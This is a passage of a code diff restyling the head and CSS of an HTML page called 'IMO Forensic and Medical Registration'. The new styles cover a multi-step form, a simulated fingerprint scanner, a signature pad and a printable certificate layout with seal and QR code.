@@ -1,823 +1,1827 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IMO Forensic and Medical Registration</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdn.jsdelivr.net/npm/@fontsource/inter@5.0.16/400.css" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/@fontsource/inter@5.0.16/600.css" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/@fontsource/inter@5.0.16/700.css" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-    <style>
-        body {
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
-            min-height: 100vh;
-        }
-        .glass-panel {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.5);
-            box-shadow: 0 8px 32px rgba(30, 58, 138, 0.08);
-        }
-        .step-active {
-            background-color: #1e3a8a;
-            color: white;
-            border-color: #1e3a8a;
-        }
-        .step-completed {
-            background-color: #10b981;
-            color: white;
-            border-color: #10b981;
-        }
-        .scanner-area {
-            position: relative;
-            width: 200px;
-            height: 240px;
-            border: 3px solid #cbd5e1;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: #f8fafc;
-            overflow: hidden;
-        }
-        .scanner-area:hover {
-            border-color: #1e3a8a;
-            box-shadow: 0 0 20px rgba(30, 58, 138, 0.2);
-        }
-        .scanner-area.scanning {
-            border-color: #10b981;
-            box-shadow: 0 0 30px rgba(16, 185, 129, 0.4);
-        }
-        .scan-line {
-            position: absolute;
-            width: 100%;
-            height: 4px;
-            background: linear-gradient(90deg, transparent, #10b981, transparent);
-            top: 0;
-            left: 0;
-            opacity: 0;
-        }
-        .scanner-area.scanning .scan-line {
-            opacity: 1;
-            animation: scanMove 2s linear infinite;
-        }
-        @keyframes scanMove {
-            0% { top: 0%; }
-            50% { top: 100%; }
-            100% { top: 0%; }
-        }
-        .fingerprint-icon {
-            width: 120px;
-            height: 120px;
-            fill: #94a3b8;
-            transition: all 0.3s ease;
-        }
-        .scanner-area.scanning .fingerprint-icon {
-            fill: #10b981;
-            filter: drop-shadow(0 0 8px rgba(16, 185, 129, 0.6));
-        }
-        .finger-dot {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: #e2e8f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            font-weight: 600;
-            color: #64748b;
-            transition: all 0.3s ease;
-        }
-        .finger-dot.completed {
-            background: #10b981;
-            color: white;
-            transform: scale(1.1);
-        }
-        .official-stamp {
-            width: 160px;
-            height: 160px;
-            border: 4px double #b91c1c;
-            border-radius: 50%;
-            color: #b91c1c;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            font-weight: 800;
-            font-size: 13px;
-            text-transform: uppercase;
-            transform: rotate(-15deg);
-            opacity: 0.75;
-            position: relative;
-            background: radial-gradient(circle, transparent 60%, rgba(185, 28, 28, 0.05) 70%);
-        }
-        .official-stamp::before {
-            content: '';
-            position: absolute;
-            top: 8px; left: 8px; right: 8px; bottom: 8px;
-            border: 2px solid #b91c1c;
-            border-radius: 50%;
-        }
-        .fade-in {
-            animation: fadeIn 0.5s ease-in-out;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .success-checkmark {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: #10b981;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-        @keyframes popIn {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
-        }
-        @media print {
-            body * {
-                visibility: hidden;
-            }
-            #receipt-content, #receipt-content * {
-                visibility: visible;
-            }
-            #receipt-content {
-                position: absolute;
-                left: 0;
-                top: 0;
-                width: 100%;
-                margin: 0;
-                padding: 20px;
-                box-shadow: none;
-                border: 2px solid #1e3a8a;
-            }
-            .no-print {
-                display: none !important;
-            }
-        }
-        .signature-canvas {
-            touch-action: none;
-            cursor: crosshair;
-        }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="theme-color" content="#003a70" />
+<title>IMO Forensic and Medical Registration</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Playfair+Display:wght@600;700;800;900&family=Dancing+Script:wght@600;700&display=swap" rel="stylesheet" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+  /* ===================== RESET & BASE ===================== */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  :root{
+    --primary:#003a70;
+    --primary-2:#0a4a8c;
+    --secondary:#1e88e5;
+    --secondary-2:#42a5f5;
+    --accent-gold:#c9a227;
+    --accent-gold-2:#e6b94a;
+    --accent-green:#10b981;
+    --accent-green-2:#34d399;
+    --bg:#eef3f9;
+    --bg-2:#f6f9fd;
+    --text:#0f1e35;
+    --text-2:#475569;
+    --muted:#64748b;
+    --white:#ffffff;
+    --line:#dbe3ee;
+    --line-2:#e7edf5;
+    --shadow-sm:0 4px 14px rgba(0,58,112,.08);
+    --shadow:0 14px 40px rgba(0,58,112,.12);
+    --shadow-lg:0 24px 60px rgba(0,58,112,.18);
+    --glass:rgba(255,255,255,.72);
+    --glass-border:rgba(255,255,255,.55);
+    --grad-blue:linear-gradient(135deg,#003a70 0%,#0a4a8c 45%,#1e88e5 100%);
+    --grad-gold:linear-gradient(135deg,#c9a227 0%,#e6b94a 100%);
+    --grad-success:linear-gradient(135deg,#059669 0%,#10b981 50%,#34d399 100%);
+    --radius:16px;
+    --radius-sm:10px;
+    --radius-lg:24px;
+  }
+  body{
+    font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+    color:var(--text);
+    background:
+      radial-gradient(1200px 700px at 10% -10%, rgba(30,136,229,.18), transparent 60%),
+      radial-gradient(900px 600px at 110% 10%, rgba(201,162,39,.14), transparent 60%),
+      radial-gradient(800px 600px at 50% 110%, rgba(16,185,129,.10), transparent 60%),
+      linear-gradient(180deg,var(--bg) 0%, var(--bg-2) 100%);
+    min-height:100%;
+    line-height:1.55;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+  /* Decorative blobs */
+  body::before, body::after{
+    content:""; position:fixed; pointer-events:none; z-index:0; filter:blur(80px); opacity:.35;
+  }
+  body::before{ width:420px; height:420px; border-radius:50%; background:radial-gradient(circle, #1e88e5 0%, transparent 70%); top:-120px; left:-120px; }
+  body::after{ width:380px; height:380px; border-radius:50%; background:radial-gradient(circle, #c9a227 0%, transparent 70%); bottom:-100px; right:-100px; opacity:.22; }
+
+  h1,h2,h3,h4{ font-family:'Playfair Display', Georgia, serif; font-weight:700; color:var(--primary); letter-spacing:.2px; }
+  a{ color:inherit; text-decoration:none; }
+  button{ font-family:inherit; cursor:pointer; border:none; background:none; }
+  input,select,textarea{ font-family:inherit; font-size:1rem; }
+
+  /* ===================== HEADER ===================== */
+  .app-header{
+    position:sticky; top:0; z-index:50;
+    background:linear-gradient(180deg, rgba(255,255,255,.85) 0%, rgba(255,255,255,.7) 100%);
+    backdrop-filter:saturate(180%) blur(14px);
+    -webkit-backdrop-filter:saturate(180%) blur(14px);
+    border-bottom:1px solid rgba(0,58,112,.08);
+  }
+  .header-inner{
+    max-width:1240px; margin:0 auto; padding:14px 20px;
+    display:flex; align-items:center; gap:18px; flex-wrap:wrap;
+  }
+  .brand{ display:flex; align-items:center; gap:12px; min-width:0; }
+  .brand-mark{
+    width:52px; height:52px; border-radius:14px; flex-shrink:0;
+    background:var(--grad-blue);
+    display:grid; place-items:center; color:#fff;
+    box-shadow:0 10px 24px rgba(0,58,112,.35), inset 0 0 0 1px rgba(255,255,255,.18);
+    position:relative; overflow:hidden;
+  }
+  .brand-mark::after{
+    content:""; position:absolute; inset:0;
+    background:linear-gradient(135deg, rgba(255,255,255,.25), transparent 50%);
+  }
+  .brand-mark svg{ width:30px; height:30px; }
+  .brand-text{ min-width:0; }
+  .brand-title{
+    font-family:'Playfair Display', serif; font-weight:800; font-size:1.15rem; line-height:1.15;
+    color:var(--primary); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+  }
+  .brand-sub{
+    font-size:.74rem; color:var(--muted); letter-spacing:1.2px; text-transform:uppercase; font-weight:600;
+  }
+  .countries{
+    display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-left:6px;
+  }
+  .flag-chip{
+    display:inline-flex; align-items:center; gap:6px;
+    padding:6px 10px; border-radius:999px;
+    background:rgba(0,58,112,.06); border:1px solid rgba(0,58,112,.12);
+    font-size:.78rem; font-weight:600; color:var(--primary);
+  }
+  .lang-select{
+    margin-left:auto;
+    display:inline-flex; align-items:center; gap:8px;
+    padding:8px 12px; border-radius:12px; background:rgba(0,58,112,.06);
+    border:1px solid rgba(0,58,112,.14); color:var(--primary); font-weight:600; font-size:.85rem;
+  }
+  .lang-select select{
+    background:transparent; border:none; outline:none; color:var(--primary); font-weight:700; font-size:.85rem; padding-right:4px;
+  }
+  .lang-select svg{ width:16px; height:16px; color:var(--primary); }
+
+  /* ===================== MAIN LAYOUT ===================== */
+  .container{ max-width:1080px; margin:0 auto; padding:28px 20px 80px; position:relative; z-index:1; }
+  .screen{ display:none; animation:fadeUp .55s cubic-bezier(.2,.7,.2,1); }
+  .screen.active{ display:block; }
+  @keyframes fadeUp{ from{ opacity:0; transform:translateY(14px);} to{ opacity:1; transform:translateY(0);} }
+
+  /* ===================== PROGRESS ===================== */
+  .progress-wrap{
+    display:flex; align-items:center; gap:14px; margin-bottom:22px;
+    padding:16px 18px; border-radius:var(--radius);
+    background:var(--glass); backdrop-filter:blur(12px);
+    border:1px solid var(--glass-border); box-shadow:var(--shadow-sm);
+  }
+  .progress-label{ font-weight:700; color:var(--primary); font-size:.9rem; min-width:140px; }
+  .progress-track{
+    flex:1; height:10px; background:rgba(0,58,112,.08); border-radius:999px; overflow:hidden; position:relative;
+  }
+  .progress-fill{
+    height:100%; width:0%; border-radius:999px;
+    background:linear-gradient(90deg, var(--primary) 0%, var(--secondary) 50%, var(--accent-gold) 100%);
+    transition:width .6s cubic-bezier(.2,.7,.2,1);
+    position:relative;
+  }
+  .progress-fill::after{
+    content:""; position:absolute; inset:0;
+    background:linear-gradient(90deg, transparent, rgba(255,255,255,.5), transparent);
+    animation:shimmer 2.2s linear infinite;
+  }
+  @keyframes shimmer{ 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
+  .progress-count{ font-weight:800; color:var(--primary); font-size:.9rem; min-width:60px; text-align:right; }
+
+  /* ===================== CARDS ===================== */
+  .card{
+    background:var(--glass); backdrop-filter:blur(14px);
+    border:1px solid var(--glass-border); border-radius:var(--radius-lg);
+    box-shadow:var(--shadow); padding:30px;
+  }
+  .card-hero{
+    background:linear-gradient(135deg, rgba(0,58,112,.04), rgba(30,136,229,.04));
+    border:1px solid rgba(0,58,112,.08);
+    border-radius:var(--radius-lg); padding:34px 28px; text-align:center; margin-bottom:22px;
+    position:relative; overflow:hidden;
+  }
+  .card-hero h1{ font-size:2rem; margin-bottom:8px; }
+  .card-hero p{ color:var(--text-2); max-width:680px; margin:0 auto; }
+  .ribbon{
+    display:inline-flex; align-items:center; gap:8px;
+    padding:6px 12px; border-radius:999px;
+    background:linear-gradient(135deg, rgba(201,162,39,.14), rgba(201,162,39,.06));
+    color:#8a6d10; font-weight:700; font-size:.75rem; letter-spacing:1.2px; text-transform:uppercase;
+    border:1px solid rgba(201,162,39,.3);
+  }
+  .ribbon.green{ background:linear-gradient(135deg, rgba(16,185,129,.14), rgba(16,185,129,.06)); color:#047857; border-color:rgba(16,185,129,.3); }
+  .ribbon.blue{ background:linear-gradient(135deg, rgba(30,136,229,.14), rgba(30,136,229,.06)); color:#0a4a8c; border-color:rgba(30,136,229,.3); }
+
+  /* ===================== FORM ===================== */
+  .form-grid{ display:grid; grid-template-columns:repeat(2,1fr); gap:18px; }
+  .field{ display:flex; flex-direction:column; gap:6px; }
+  .field.full{ grid-column:1 / -1; }
+  .label{ font-weight:600; color:var(--primary); font-size:.85rem; display:flex; align-items:center; gap:6px; }
+  .label .req{ color:#dc2626; font-weight:800; }
+  .input, .select{
+    padding:12px 14px; border-radius:12px; border:1.5px solid var(--line);
+    background:#fff; color:var(--text); outline:none; transition:all .2s;
+    box-shadow:0 1px 0 rgba(0,58,112,.02);
+  }
+  .input:focus, .select:focus{
+    border-color:var(--secondary); box-shadow:0 0 0 4px rgba(30,136,229,.15);
+  }
+  .input.error, .select.error{ border-color:#dc2626; box-shadow:0 0 0 4px rgba(220,38,38,.1); }
+  .err-msg{ color:#dc2626; font-size:.78rem; font-weight:600; display:none; }
+  .err-msg.show{ display:block; }
+  .photo-upload{
+    border:2px dashed var(--line); border-radius:14px; padding:18px;
+    text-align:center; background:rgba(255,255,255,.55); cursor:pointer; transition:all .2s;
+    display:flex; align-items:center; gap:14px; justify-content:center; flex-wrap:wrap;
+  }
+  .photo-upload:hover{ border-color:var(--secondary); background:rgba(30,136,229,.05); }
+  .photo-upload .icon{ width:48px; height:48px; border-radius:50%; background:var(--grad-blue); display:grid; place-items:center; color:#fff; flex-shrink:0; }
+  .photo-upload .icon svg{ width:22px; height:22px; }
+  .photo-upload .info{ text-align:left; }
+  .photo-upload .info b{ display:block; color:var(--primary); font-size:.92rem; }
+  .photo-upload .info span{ color:var(--muted); font-size:.78rem; }
+  .photo-preview{
+    width:84px; height:84px; border-radius:14px; background:#fff; border:1.5px solid var(--line);
+    object-fit:cover; display:none;
+  }
+  .photo-preview.show{ display:block; }
+  input[type="file"]{ display:none; }
+
+  /* ===================== BUTTONS ===================== */
+  .btn{
+    display:inline-flex; align-items:center; justify-content:center; gap:10px;
+    padding:14px 22px; border-radius:14px; font-weight:700; font-size:.95rem;
+    transition:all .25s cubic-bezier(.2,.7,.2,1); user-select:none;
+    border:1.5px solid transparent;
+  }
+  .btn-primary{
+    background:var(--grad-blue); color:#fff;
+    box-shadow:0 10px 24px rgba(0,58,112,.28);
+  }
+  .btn-primary:hover{ transform:translateY(-2px); box-shadow:0 14px 30px rgba(0,58,112,.36); }
+  .btn-primary:active{ transform:translateY(0); }
+  .btn-gold{ background:var(--grad-gold); color:#3a2c00; box-shadow:0 10px 24px rgba(201,162,39,.32); }
+  .btn-gold:hover{ transform:translateY(-2px); }
+  .btn-ghost{ background:rgba(255,255,255,.7); color:var(--primary); border-color:var(--line); }
+  .btn-ghost:hover{ background:#fff; border-color:var(--secondary); }
+  .btn-success{ background:var(--grad-success); color:#fff; box-shadow:0 10px 24px rgba(16,185,129,.32); }
+  .btn-success:hover{ transform:translateY(-2px); }
+  .btn svg{ width:18px; height:18px; }
+  .btn-block{ width:100%; }
+  .actions{ display:flex; gap:12px; flex-wrap:wrap; margin-top:24px; }
+  .actions.right{ justify-content:flex-end; }
+  .actions.center{ justify-content:center; }
+
+  /* ===================== BIOMETRIC STAGE ===================== */
+  .biometric-stage{
+    text-align:center; padding:30px 24px 40px;
+  }
+  .hand-title{
+    font-family:'Playfair Display', serif; font-weight:800; font-size:1.8rem; color:var(--primary);
+    margin-bottom:6px;
+  }
+  .hand-sub{ color:var(--text-2); margin-bottom:20px; }
+  .finger-status{
+    display:inline-flex; align-items:center; gap:8px;
+    padding:8px 14px; border-radius:999px; background:rgba(30,136,229,.1);
+    color:var(--primary); font-weight:700; font-size:.85rem; margin-bottom:24px;
+  }
+  .finger-status .dot{ width:8px; height:8px; border-radius:50%; background:var(--secondary); box-shadow:0 0 0 0 rgba(30,136,229,.6); animation:pulse 1.6s infinite; }
+  @keyframes pulse{ 0%{box-shadow:0 0 0 0 rgba(30,136,229,.6);} 70%{box-shadow:0 0 0 14px rgba(30,136,229,0);} 100%{box-shadow:0 0 0 0 rgba(30,136,229,0);} }
+
+  .scanner{
+    position:relative; width:280px; height:280px; margin:0 auto 24px;
+    border-radius:50%; display:grid; place-items:center;
+    background:radial-gradient(circle at 50% 50%, rgba(30,136,229,.10) 0%, rgba(0,58,112,.06) 60%, transparent 100%);
+  }
+  .scanner-ring{
+    position:absolute; inset:0; border-radius:50%;
+    border:2px dashed rgba(0,58,112,.18);
+  }
+  .scanner-ring.spin{ animation:spin 8s linear infinite; }
+  .scanner-ring.spin.rev{ animation:spin 10s linear infinite reverse; opacity:.5; }
+  @keyframes spin{ to{ transform:rotate(360deg);} }
+  .fingerprint-target{
+    position:relative; width:200px; height:200px; border-radius:50%;
+    background:linear-gradient(135deg, #f8fbff, #e6eef9);
+    border:2px solid rgba(30,136,229,.4);
+    display:grid; place-items:center; cursor:pointer;
+    box-shadow:0 12px 30px rgba(0,58,112,.18), inset 0 0 30px rgba(30,136,229,.08);
+    transition:transform .2s;
+    overflow:hidden;
+    -webkit-tap-highlight-color:transparent;
+  }
+  .fingerprint-target:hover{ transform:scale(1.02); }
+  .fingerprint-target.active{ border-color:var(--accent-green); box-shadow:0 0 0 6px rgba(16,185,129,.18), 0 12px 30px rgba(0,58,112,.18); }
+  .fingerprint-target svg.fp-icon{ width:120px; height:120px; opacity:.85; }
+  .fp-glow{
+    position:absolute; inset:0; border-radius:50%; pointer-events:none;
+    box-shadow:0 0 0 0 rgba(30,136,229,0); transition:box-shadow .3s;
+  }
+  .fingerprint-target.scanning .fp-glow{
+    box-shadow:0 0 0 18px rgba(30,136,229,.18), inset 0 0 40px rgba(30,136,229,.25);
+  }
+  .fingerprint-target.completed .fp-glow{
+    box-shadow:0 0 0 22px rgba(16,185,129,.22), inset 0 0 40px rgba(16,185,129,.18);
+  }
+  .fp-tap-hint{
+    position:absolute; bottom:-38px; left:50%; transform:translateX(-50%);
+    color:var(--muted); font-size:.82rem; font-weight:600; white-space:nowrap;
+  }
+  .scan-line{
+    position:absolute; left:8%; right:8%; height:3px; border-radius:3px;
+    background:linear-gradient(90deg, transparent, var(--secondary), transparent);
+    box-shadow:0 0 18px var(--secondary);
+    top:0; opacity:0; transition:opacity .2s;
+  }
+  .fingerprint-target.scanning .scan-line{ opacity:1; animation:scanLine 2s linear forwards; }
+  @keyframes scanLine{ 0%{ top:6%; } 100%{ top:92%; } }
+
+  .finger-prompt{
+    font-size:1.1rem; font-weight:700; color:var(--primary); margin-bottom:6px;
+  }
+  .finger-help{ color:var(--muted); font-size:.88rem; }
+
+  .scan-progress{
+    width:280px; max-width:90%; margin:0 auto 18px;
+    height:8px; background:rgba(0,58,112,.08); border-radius:999px; overflow:hidden;
+    display:none;
+  }
+  .scan-progress.show{ display:block; }
+  .scan-progress-bar{
+    height:100%; width:0%; background:linear-gradient(90deg, var(--secondary), var(--accent-green));
+    border-radius:999px; transition:width .1s linear;
+  }
+
+  .finger-grid{
+    display:grid; grid-template-columns:repeat(5,1fr); gap:10px; max-width:540px; margin:30px auto 0;
+  }
+  .finger-dot{
+    display:flex; flex-direction:column; align-items:center; gap:6px;
+    padding:12px 6px; border-radius:14px; background:rgba(255,255,255,.55);
+    border:1.5px solid var(--line); transition:all .3s;
+  }
+  .finger-dot .ico{
+    width:36px; height:36px; border-radius:10px; display:grid; place-items:center;
+    background:rgba(0,58,112,.05); color:var(--muted); transition:all .3s;
+  }
+  .finger-dot .ico svg{ width:18px; height:18px; }
+  .finger-dot .name{ font-size:.7rem; font-weight:600; color:var(--text-2); text-align:center; line-height:1.15; }
+  .finger-dot.active{ border-color:var(--secondary); background:rgba(30,136,229,.08); transform:translateY(-2px); }
+  .finger-dot.active .ico{ background:var(--secondary); color:#fff; box-shadow:0 6px 14px rgba(30,136,229,.4); }
+  .finger-dot.done{ border-color:var(--accent-green); background:rgba(16,185,129,.08); }
+  .finger-dot.done .ico{ background:var(--accent-green); color:#fff; }
+  .finger-dot.done .name{ color:#047857; }
+  .finger-counter{ text-align:center; margin-top:14px; font-weight:700; color:var(--primary); }
+  .finger-counter b{ color:var(--accent-gold-2); font-size:1.1rem; }
+
+  /* ===================== SUCCESS ===================== */
+  .success-stage{ text-align:center; padding:20px 0; }
+  .check-circle{
+    width:120px; height:120px; border-radius:50%; margin:0 auto 18px;
+    background:var(--grad-success); display:grid; place-items:center; color:#fff;
+    box-shadow:0 18px 50px rgba(16,185,129,.4);
+    animation:pop .6s cubic-bezier(.2,1.4,.4,1);
+  }
+  @keyframes pop{ 0%{transform:scale(.3); opacity:0;} 100%{transform:scale(1); opacity:1;} }
+  .check-circle svg{ width:64px; height:64px; stroke-dasharray:60; stroke-dashoffset:60; animation:draw .8s .3s forwards; }
+  @keyframes draw{ to{ stroke-dashoffset:0; } }
+  .success-stage h1{ font-size:2.2rem; margin-bottom:8px; }
+  .success-stage .sub{ color:var(--text-2); margin-bottom:24px; }
+
+  .check-list{ display:flex; flex-direction:column; gap:10px; max-width:480px; margin:0 auto 28px; }
+  .check-row{
+    display:flex; align-items:center; gap:12px; padding:12px 16px; border-radius:14px;
+    background:rgba(16,185,129,.06); border:1px solid rgba(16,185,129,.18);
+    font-weight:600; color:#047857; text-align:left;
+  }
+  .check-row .ck{
+    width:28px; height:28px; border-radius:50%; background:var(--grad-success);
+    color:#fff; display:grid; place-items:center; flex-shrink:0;
+  }
+  .check-row .ck svg{ width:16px; height:16px; }
+
+  .info-grid{ display:grid; grid-template-columns:repeat(2,1fr); gap:12px; max-width:680px; margin:0 auto 20px; text-align:left; }
+  .info-tile{
+    padding:14px 16px; border-radius:14px; background:rgba(255,255,255,.7);
+    border:1px solid var(--line);
+  }
+  .info-tile .k{ font-size:.74rem; color:var(--muted); text-transform:uppercase; letter-spacing:1px; font-weight:700; }
+  .info-tile .v{ font-size:1rem; color:var(--text); font-weight:700; margin-top:2px; word-break:break-word; }
+  .info-tile.full{ grid-column:1 / -1; }
+  .applicant-photo-frame{
+    width:140px; height:140px; border-radius:18px; background:#fff;
+    border:3px solid var(--white); box-shadow:var(--shadow);
+    margin:0 auto 12px; overflow:hidden; display:grid; place-items:center; color:var(--muted);
+  }
+  .applicant-photo-frame img{ width:100%; height:100%; object-fit:cover; }
+
+  /* ===================== RECEIPT / CERTIFICATE ===================== */
+  .cert-toolbar{
+    display:flex; gap:10px; flex-wrap:wrap; justify-content:center; margin:0 0 18px;
+  }
+  .certificate{
+    background:#fff; color:#10243f; border-radius:14px; padding:22px 26px;
+    box-shadow:0 24px 60px rgba(0,58,112,.18);
+    border:1px solid var(--line);
+    width:210mm; max-width:100%; margin:0 auto;
+    position:relative; overflow:hidden;
+    font-size:10.5pt;
+  }
+  .cert-watermark{
+    position:absolute; inset:0; display:grid; place-items:center; pointer-events:none; opacity:.05;
+  }
+  .cert-watermark svg{ width:60%; max-width:520px; }
+  .cert-header{
+    display:flex; align-items:center; gap:14px; padding-bottom:12px;
+    border-bottom:2px solid var(--primary); margin-bottom:12px;
+  }
+  .cert-logo{
+    width:54px; height:54px; border-radius:12px; background:var(--grad-blue);
+    display:grid; place-items:center; color:#fff; flex-shrink:0;
+    box-shadow:0 6px 16px rgba(0,58,112,.3);
+  }
+  .cert-logo svg{ width:30px; height:30px; }
+  .cert-title{
+    font-family:'Playfair Display', serif; font-weight:800; color:var(--primary);
+    font-size:1.15rem; line-height:1.1;
+  }
+  .cert-sub{ font-size:.66rem; color:var(--muted); letter-spacing:1.4px; text-transform:uppercase; font-weight:700; }
+  .cert-id{ margin-left:auto; text-align:right; }
+  .cert-id .k{ font-size:.62rem; color:var(--muted); text-transform:uppercase; letter-spacing:1.2px; font-weight:700; }
+  .cert-id .v{ font-family:'Inter', sans-serif; font-weight:800; color:var(--primary); font-size:.9rem; }
+
+  .cert-body{ display:grid; grid-template-columns:1fr 140px; gap:18px; align-items:start; }
+  .cert-section-title{
+    font-family:'Inter', sans-serif; font-weight:800; color:var(--primary);
+    font-size:.7rem; text-transform:uppercase; letter-spacing:1.6px;
+    margin:6px 0 4px; display:flex; align-items:center; gap:8px;
+  }
+  .cert-section-title::before{ content:""; width:18px; height:2px; background:var(--accent-gold); border-radius:2px; }
+  .cert-row{ display:grid; grid-template-columns:repeat(2,1fr); gap:6px 14px; margin-bottom:6px; }
+  .cert-field .k{ font-size:.62rem; color:var(--muted); text-transform:uppercase; letter-spacing:1.1px; font-weight:700; }
+  .cert-field .v{ font-size:.82rem; color:var(--text); font-weight:700; }
+  .cert-photo{
+    width:120px; height:120px; border-radius:8px; overflow:hidden;
+    border:2px solid var(--primary); background:#f0f4f8; display:grid; place-items:center; color:var(--muted);
+    margin:0 auto;
+  }
+  .cert-photo img{ width:100%; height:100%; object-fit:cover; }
+  .cert-status{
+    display:inline-flex; align-items:center; gap:6px;
+    padding:5px 10px; border-radius:999px; background:rgba(16,185,129,.12);
+    color:#047857; font-weight:800; font-size:.7rem; letter-spacing:1.4px; text-transform:uppercase;
+    border:1px solid rgba(16,185,129,.35);
+  }
+  .cert-status .d{ width:7px; height:7px; border-radius:50%; background:#10b981; }
+  .cert-statement{
+    margin-top:8px; padding:9px 12px; background:rgba(0,58,112,.04);
+    border-left:3px solid var(--accent-gold); border-radius:6px;
+    font-style:italic; color:var(--text-2); font-size:.8rem;
+  }
+  .cert-footer{
+    display:flex; flex-direction:column; gap:6px; margin-top:8px;
+    padding-top:6px; border-top:1.5px solid var(--line);
+  }
+  .cert-sig-row{
+    display:grid; grid-template-columns:1fr 130px 1fr; gap:14px; align-items:end;
+  }
+  .cert-date-row{
+    display:grid; grid-template-columns:1fr 130px 1fr; gap:14px;
+    font-size:.62rem; color:var(--muted); text-transform:uppercase; letter-spacing:1.1px; font-weight:700;
+  }
+  .cert-date-row .dt{ color:var(--text); font-weight:800; text-transform:none; letter-spacing:.3px; font-size:.78rem; }
+  .cert-signature{ text-align:center; min-width:0; }
+  .cert-signature .sig-img{ width:170px; height:60px; display:inline-block; }
+  .cert-signature .sig-img img{ width:100%; height:100%; object-fit:contain; }
+  .cert-signature .sig-img svg{ width:100%; height:100%; }
+  .cert-signature .name{ font-weight:800; color:var(--text); font-size:.78rem; margin-top:0; }
+  .cert-signature .role{ font-size:.62rem; color:var(--muted); text-transform:uppercase; letter-spacing:1.2px; font-weight:700; }
+
+  /* ===================== SIGNATURE PAD ===================== */
+  .sig-stage{ padding:18px 8px 8px; }
+  .sig-instruction{
+    text-align:center; font-size:1rem; color:var(--primary); font-weight:600; margin-bottom:14px;
+  }
+  .sig-pad-wrap{
+    position:relative; max-width:640px; margin:0 auto 14px;
+    border-radius:18px; padding:14px;
+    background:linear-gradient(135deg, rgba(0,58,112,.04), rgba(30,136,229,.04));
+    border:1.5px dashed rgba(0,58,112,.25);
+  }
+  .sig-pad{
+    width:100%; height:220px; display:block; border-radius:12px;
+    background:
+      repeating-linear-gradient(0deg, transparent 0, transparent 31px, rgba(0,58,112,.06) 31px, rgba(0,58,112,.06) 32px),
+      linear-gradient(180deg, #ffffff, #fafcff);
+    box-shadow:inset 0 2px 8px rgba(0,58,112,.06);
+    touch-action:none; cursor:crosshair;
+  }
+  .sig-pad-hint{
+    position:absolute; inset:0; display:grid; place-items:center; pointer-events:none;
+    color:rgba(0,58,112,.22); font-weight:700; font-size:1.05rem; letter-spacing:1.2px;
+    text-transform:uppercase; transition:opacity .25s;
+  }
+  .sig-pad-wrap.has-ink .sig-pad-hint{ opacity:0; }
+  .sig-x-line{
+    position:absolute; left:14px; right:14px; bottom:54px; height:1px; background:rgba(0,58,112,.18); pointer-events:none;
+  }
+  .sig-actions{
+    display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-top:6px;
+  }
+  .sig-saved-badge{
+    display:none; align-items:center; gap:6px; padding:8px 14px; border-radius:999px;
+    background:rgba(16,185,129,.12); color:#047857; font-weight:700; font-size:.85rem;
+    border:1px solid rgba(16,185,129,.3); margin:0 auto 8px; max-width:fit-content;
+  }
+  .sig-saved-badge.show{ display:inline-flex; }
+  .sig-saved-badge svg{ width:16px; height:16px; }
+  .cert-seal-wrap{ display:grid; place-items:center; }
+  .cert-seal-wrap svg{ width:108px; height:108px; }
+  .cert-qr{ display:grid; place-items:center; }
+  .cert-qr #qrcode{ width:96px; height:96px; display:grid; place-items:center; }
+  .cert-qr #qrcode img, .cert-qr #qrcode canvas{
+    width:96px !important; height:96px !important;
+    image-rendering:pixelated; image-rendering:-moz-crisp-edges; image-rendering:crisp-edges;
+    display:block; background:#fff; border-radius:2px;
+  }
+  .cert-qr .qcap{ font-size:.58rem; color:var(--muted); text-transform:uppercase; letter-spacing:1px; font-weight:700; margin-top:3px; text-align:center; max-width:120px; line-height:1.25; }
+  .cert-center{ display:flex; flex-direction:column; align-items:center; gap:6px; }
+  .sig-empty{ color:rgba(0,58,112,.3); font-size:.7rem; font-style:italic; display:grid; place-items:center; height:100%; }
+  .cert-date-row .dt-cell{ text-align:center; padding:2px 4px; }
+
+  /* ===================== FOOTER ===================== */
+  .app-footer{
+    text-align:center; padding:30px 20px; color:var(--muted); font-size:.82rem;
